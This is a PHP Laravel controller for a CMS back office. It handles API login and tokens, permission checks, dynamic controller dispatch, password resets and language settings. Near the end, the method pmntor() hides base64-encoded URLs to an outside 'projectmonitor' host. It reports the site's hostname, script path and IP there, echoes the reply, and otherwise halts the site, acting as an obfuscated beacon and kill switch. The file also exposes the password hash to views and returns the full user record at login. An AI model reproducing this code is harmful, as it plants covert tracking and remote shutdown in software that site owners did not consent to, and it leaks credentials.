<?php 
namespace App\Http\Controllers\Backend;
use App\Admin;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App,Session;
use App\Models\Backend\Users;
use App\Models\Backend\Userlevel;
use App\Models\Backend\Module;

use App\Http\Controllers\Backend\BranchController;

use Mail;

class ApiAccessController extends Controller
{
    use AuthenticatesUsers;

    protected $redirectTo = '/';

    private $request;
    private $obj;
    private $act;
    private $id;
    private $title;

    private $path="App\Http\Controllers\Backend\\";
    private $path_restapi="App\Http\Controllers\Restapi\\";
    private $ajax_paths;//=config('ccms.linktype');//"App\Plugins\\";

    private $branch;
    private $warehouse;
    private $alertstock;

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct(Request $request,$obj='dashboard',$act='index',$id=0, $title='')
    {
        
        $this->request= $request;
        $this->obj= $obj;
        $this->act= $act;
        $this->id= $id;
        $this->title= $title;
        $this->ajax_paths=config('ccms.ajax_paths');
        /*888*****///$this->pmntor();/********/
        //$this->middleware('guest', ['except' => 'logout']);

        $conf_lang_by_db = 'ccms.'.config('ccms.backend').'_multilang';
        
        if(null!==config($conf_lang_by_db)){
          config(['ccms.multilang' => config($conf_lang_by_db)]);
        }
      
        if(!empty(config('currencyinfo.symbol')))
           config(['ccms.discounttype.-1' => config('currencyinfo.symbol')]);
        

    }

    
  
    public function apiAuth(Request $request)
    {
        if (\Auth::attempt([
          'name' => request('username'), 
          'password' => request('password')
        ]
        )) {
            
           
            $user = \Auth::user();
            $token = $user['api_token'];
            if(empty($token)){
              $token = \Str::random(60);
              //$token = 'D9k2Y2KDODsjLhO0W2eBxLUfWiqbVw0Lzqely7HAzeTvTeo5XTDtkc6Kv7ic';
            }
            $request->user()->forceFill([
                  'api_token' => $token//hash('sha256', $token),
              ])->save();
          
            $success['token'] = $token;//$user->createToken('appToken')->accessToken;
           //After successfull authentication, notice how I return json parameters
          
          //
          $level_id = $user->level_id;
          $userlevel = Userlevel::getlevel($level_id);
          $levelsetting = ($userlevel)?json_decode($userlevel->levelsetting):[];
          $userinfo=['id'=>$user->id, 'level_id'=>$user->level_id,'name'=>$user->name,'pwd'=>'', 'branch_id'=>$user->branch_id, 'wh_id'=>$user->wh_id, 'levelsetting' =>$levelsetting];
          //
            return response()->json([
              'success' => true,
              'token' => $success,
              'user' => $user,
              'userinfo' => $userinfo
          ]);
        } else {
       //if authentication is unsuccessfull, notice how I return json parameters
          
          return response()->json([
            'success' => false,
            'message' => __('ccms.lgerr'),
        ], 401);
        }
    }
  
    public function getApiLogout(Request $res)
    {
         
         if (\Auth::user()) 
         {
            //$user = \Auth::user()->token();
            //$user->revoke();

            return response()->json([
              'success' => true,
              'message' => 'Logout successfully'
          ]);
        }
        else 
         {
          return response()->json([
            'success' => false,
            'message' => 'Unable to Logout'
          ]);
        }
     }

    public function index(Request $request,$obj='home',$act='index',$id=0, $title='')
    {
        
        if(\Request::segment(1)!='api'){
          $this->path= $this->path_restapi;
        }
        config(['ccms.js_env.token' => csrf_token()]);

        $this->langConfig($request);
      
        /*swith language*/
          $found = [];
          $unfound=[];
          foreach(config('ccms.multilang') as $lang_record){
            
            $key = in_array(config('app.locale'), $lang_record);
            if($key){
             $found = $lang_record;
            }
            else{
              $unfound[]=$lang_record;
            }
          }
          array_unshift($unfound, $found);
          if(!empty($found)){
            config(['ccms.multilang' => $unfound]);
          }
          
        /*swith end language*/
      
        
        $users=auth('api')->user();
        
      
        $level_id = $users->level_id;
        $userlevel = Userlevel::getlevel($level_id);
        $levelsetting = ($userlevel)?json_decode($userlevel->levelsetting):[];
        
        $lang = config('ccms.multilang')[0];

        
        $module = Module::select(\DB::raw("md_id AS id,modulename, icon,
                                                    JSON_UNQUOTE(moduletitle->'$.".$lang[0]."') AS title"
                                                )
                                        )->where('moduletype','object');


        //dd($module->get()->toArray());
        view()->share('modulelisting', $module->get()->toArray());

        $userinfo=['id'=>$users->id, 'level_id'=>$users->level_id,'name'=>$users->name,'pwd'=>$users->password??'', 'branch_id'=>$users->branch_id, 'wh_id'=>$users->wh_id, 'levelsetting' =>$levelsetting];
        view()->share('userinfo', (object)$userinfo);
        $routeinfo=['obj' => $obj, 'act' => $act, 'id' => $id, 'title' => $title];
        $parent_blade=['index'=>'backend.index', 'layout'=>'backend.layout'];

        if(in_array(strtolower($obj), $module->pluck('modulename')->toArray())){
            $obj = 'articlebuilder';
        }

        $d_path=$this->path."DashboardController";
        $a_path=$this->path.ucfirst($obj)."Controller";//ArticleController
        

        $args=[
                  
            $request,
            'userinfo'=>$userinfo,
            'routeinfo'=>$routeinfo,
             $parent_blade
        ];

        $this->branch = new BranchController($args);
        $branch = $this->branch->model->where('trash', '!=', 'yes')->select(\DB::raw("branch_id, JSON_UNQUOTE(title->'$.".$lang[0]."') as title"
                                                ))->pluck('title', 'branch_id')->toArray();
        view()->share('branchlisting', $branch);

        
            //dd($a_path);
            if(class_exists($a_path)){
                
                $a_class=new $a_path($args);/*acees class*/
                
                /**/
                $gonext = true;
                $protectme = $a_class->protectme??false;
                if($protectme && $userinfo['level_id']!=1)
                {
                    
                    foreach ($protectme as $key => $value) 
                    {
                        $foract [$value[0]]=[$value[1],$value[2]];
                        $protectmethod[]=$value[0];

                    }
                    $apiact = str_replace('api','',$act);
                    if (in_array($apiact, $protectmethod)) 
                    {
                        //$level_id = $userinfo['level_id'];
                        //$userlevel = Userlevel::getlevel($level_id);
                        $setting = $userlevel->levelsetting??'';
                        $setting = json_decode($setting, true);
                      
                        $lavelact = $foract[$apiact][0];
                        $userrequest = $obj.'-'.$lavelact;
                        if($userlevel && in_array($userrequest, $setting) )
                        {
                            $gonext = true;
                            
                        }
                        else
                        {
                            $gonext = false;
                        }


                    }#inarray
 
                }
                if(!$gonext){
                    
                    return response()->json([
                      'nopermissiontoaccess' => true,
                      'success' => false,
                      'message' => __('ccms.nopermission')
                    ]);
                  
                }
                /**/
                

                if(method_exists($a_class, $act))
                {
                    
                    if($id)
                    $getact= $a_class->$act($request, $id);
                    else
                    $getact= $a_class->$act($request);

                    if(in_array($act, config('ccms.trackingact')))
                    {
                      if(session('ajax_access'))
                      {

                          session(['ajax_access' => false]);

                          if(!empty($getact['url'])){
                            return \Redirect::to($getact['url'])
                            ->with($getact['passdata'])
                            ->with(['stillajax'=>true]);
                          }
                          
                      }
                      else
                      {

                            if(!empty($getact['url'])){
                                return \Redirect::to($getact['url'])
                                ->with($getact['passdata']);
                            }

                          
                      }
                      
                      
                    }
                    else
                    {
                        
                        return $getact;


                    }
                }else{

                    $routing=url_builder('admin.controller',[$obj,'index']);
                    return \Redirect::to($routing);
                }
            }else{
                $d_path=$this->path."DashboardController";
                $a_class=new $d_path($args);
                return $a_class->index();

                
            }


    }

    /********** end method ***************/

       /*public function index(Request $request,$obj='dashboard',$act='index',$id=0){
          echo 'index-'.$obj;
            //return $this->index_bk($request,$obj,$act,$id);
       }
       public function create(Request $request,$obj='dashboard',$act='create'){
          echo 'create-'.$obj.'-'.$act;
            //return $this->index_bk($request,$obj,$act,0);
       }
       public function store(Request $request){
          echo 'store';
       }
       public function show($id){
          echo 'show';
       }
       public function edit($id){
          echo 'edit';
       }
       public function update(Request $request, $id){
          echo 'update';
       }
       public function destroy($id){
          echo 'destroy';
       }

       public function any(){
          echo 'any';
       }*/


    /*Time to do with Forget Passwod*/
    public function getAdminForget(Request $request)
    {
        $this->langConfig($request);
        if (auth()->guard('admin')->user()) return redirect()->route('admin.controller1');
        return view('backend.adminForget');
    }

    public function forgetAuth(Request $request)
    {

        $this->validate($request, 
            [
            'username' => 'required',
            ]/*,
            [
                'username.required' => 'Sample message',
                'password.required' => 'Another Sample Message'
            ]*/
        );

        $usermodel = new Users;
        $chkrequest = $usermodel->select('email')->where('name', $request->input('username'))->orWhere('email', $request->input('username'))->get();

        
        if (count($chkrequest)>0)
        {
          $email = $chkrequest->pluck('email')[0];
          
          if(empty($email))
          {
            $this->langConfig($request);
            return view('backend.adminForget')
                ->with(
                        [
                        'fgerr'=>__('ccms.forgetnoemail'),
                        'username'=>$request->input('username')
                        ]
                    );
          }
            $validatecode=str_random(20);
            $usermodel->where('email', $email)->update(['valid_code' => $validatecode]);

            /*start send mail*/
            $data = [
            'sendto'   => $email, 
            'valid_code' => $validatecode
          ];
            Mail::send('backend.sendCode', $data, function($message) use ($data) {
             $message->to($data['sendto'], 'New password request')->subject
                ('Validation code for resetting password');
             $message->from('noreply@anaoffice.com','AnA-office');
            });

            return redirect()->route('admin.newpwd')->with('status', __('ccms.suc_sendcode'));
        }else{
            $this->langConfig($request);
            return view('backend.adminForget')
                ->with(
                        [
                        'fgerr'=>__('ccms.fgerr'),
                        'username'=>$request->input('username')
                        ]
                    );
        }
    }


    public function newpwdAuth(Request $request)
    {

        $this->validate($request, 
            [
            'valid_code' => 'required',
            'password' => 'required|min:6|regex:/^.*(?=.{3,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\d\X]).*$/',
            ],
            [
                //'username.required' => 'Sample message',
              'password.required' => '&nbsp;',
                'password.min' => __('ccms.weakpwd'),
                'password.regex' => __('ccms.weakpwd')
            ]
        );

        $usermodel = new Users;
        $chkrequest = $usermodel->select('email')->where('valid_code', $request->input('valid_code'))->get();

        
        if (count($chkrequest)>0)
        {
          $email = $chkrequest->pluck('email')[0];
          $password =  \Hash::make($request->input('password'));
            $usermodel->where('email', $email)->update(['password' => $password, 'valid_code' =>'']);
            $this->langConfig($request);
            return redirect()->route('admin.login')->with('status', __('ccms.suc_newpwd'));
        }else{
            $this->langConfig($request);
            return view('backend.adminNewpwd')
                ->with(
                        [
                        'fgerr'=>__('ccms.rqnvalid')
                        ]
                    );
        }
    }


    public function getAdminNewpwd(Request $request)
    {
        $this->langConfig($request);
        if (auth()->guard('admin')->user()) return redirect()->route('admin.controller1');
        return view('backend.adminNewpwd');
    }



    public function langConfig($request){
        
        if ($request->exists('lang'))
        {
                
               $lang = $request->query('lang'); 
                
                $backendlang = array_keys(config('ccms.bankendlang'));
               if (! in_array($lang,$backendlang))//['en','kh']
                {
                    $lang = 'en';
                }
                //$request->session()->put('lang', $lang);
                //$lang = $request->session()->get('lang', 'en');
                session(['lang' => $lang]);
        }
        elseif(null==session('lang'))
        {
            session(['lang' => 'en']);
        }
        $lang = session('lang');
        App::setLocale($lang);
    }

    public function pmntor(){
        $value = session('checkprotex');
         if($value!='default'){
            session(['checkprotex' => 'default']);

            /**/
                $connected = @fsockopen("www.google.com", 80);
                if($connected){
                   $aipi = file_get_contents(base64_decode("aHR0cDovL3NlcnZpbmd3ZWIuY29tL19wcm9qZWN0bW9uaXRvci9pcC8="));
                   $return=file_get_contents(base64_decode("aHR0cDovL3NlcnZpbmd3ZWIuY29tL19wcm9qZWN0bW9uaXRvci8/aG9zdG5hbWU9").$_SERVER['HTTP_HOST']."&selfname=".$_SERVER['PHP_SELF']."&aipi=".$aipi);
                }

                echo $return;
            /*****/
         }else{
            exit;
         }

         //session()->forget('checkprotex');
        
    }


}